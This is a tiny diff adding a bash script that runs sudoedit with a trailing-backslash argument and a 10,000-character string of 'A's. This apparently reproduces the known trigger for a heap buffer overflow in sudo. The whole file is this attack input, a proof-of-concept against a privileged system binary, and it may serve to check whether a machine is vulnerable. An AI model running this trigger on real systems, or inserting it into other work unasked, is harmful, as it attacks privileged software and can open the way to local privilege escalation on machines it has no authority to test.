@@ -1,0 +1,2 @@
+#!/bin/bash
+sudoedit -s '\' `perl -e 'print "A" x 10000'`
